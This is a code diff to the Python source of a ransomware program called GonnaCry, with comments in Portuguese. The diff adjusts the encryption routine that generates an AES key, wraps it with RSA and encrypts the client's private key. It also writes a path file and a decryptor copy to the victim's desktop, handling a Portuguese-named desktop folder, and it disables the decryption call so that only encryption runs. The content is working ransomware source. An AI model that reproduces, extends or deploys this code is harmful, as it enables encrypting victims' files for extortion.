@@ -9,6 +9,7 @@ from random import choice
 import multiprocessing
 import getpass
 import sys
+import shutil
 
 from AES import *
 from RSA import *
@@ -32,7 +33,7 @@ def menu(senha_AES,modo):
 
     f=open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
     a=f.read()
-    
+
     listar(senha_AES,home,tipos,modo)
     listar_media(senha_AES,modo,tipos)
 
@@ -106,19 +107,32 @@ def gera_chave_AES():
 
 def crypto_all():
 
-    # salva o caminho do GonnaCry
-    a=os.getcwd()
-    f=open(os.environ['HOME']+'/Desktop/caminho_gc.txt','w')
-    f.write(a)
+
+
 
     ## IGNORAR ARQUIVOS DO RANSOM
     AES_key=gera_chave_AES()
-    print('[*] chave AES gerada')
+    print('[*] Chave AES gerada')
     #menu(AES_key,1) # -> criptografa tudo
     AES_to_RSA()
-    print('[*] senha AES criptografado com chave RSA')
+    print('[*] Senha AES criptografado com chave RSA')
     RSA_to_SRSA()
-    print('[*] chave privada do cliente criptografada')
+    print('[*] Chave privada do cliente criptografada')
+
+    # salva o caminho do GonnaCry
+    a=os.getcwd()
+    desktop='/Área\ de\ Trabalho/'
+    rumo=os.environ['HOME']
+    if(os.path.isdir(rumo+desktop)):
+        f=open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
+        f.write(a)
+        shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
+    else:
+        desktop='/Desktop/'
+        f=open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
+        f.write(a)
+        shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
+    print('[*] Caminho salvo')
 
 def decrypt_all():
     client('localhost')
@@ -135,7 +149,7 @@ def decrypt_all():
         #menu(a,2)
 
 crypto_all()
-decrypt_all()
+#decrypt_all()
 
 # == ALGORITMO ==
     # criptografa todos os arquivos com AES
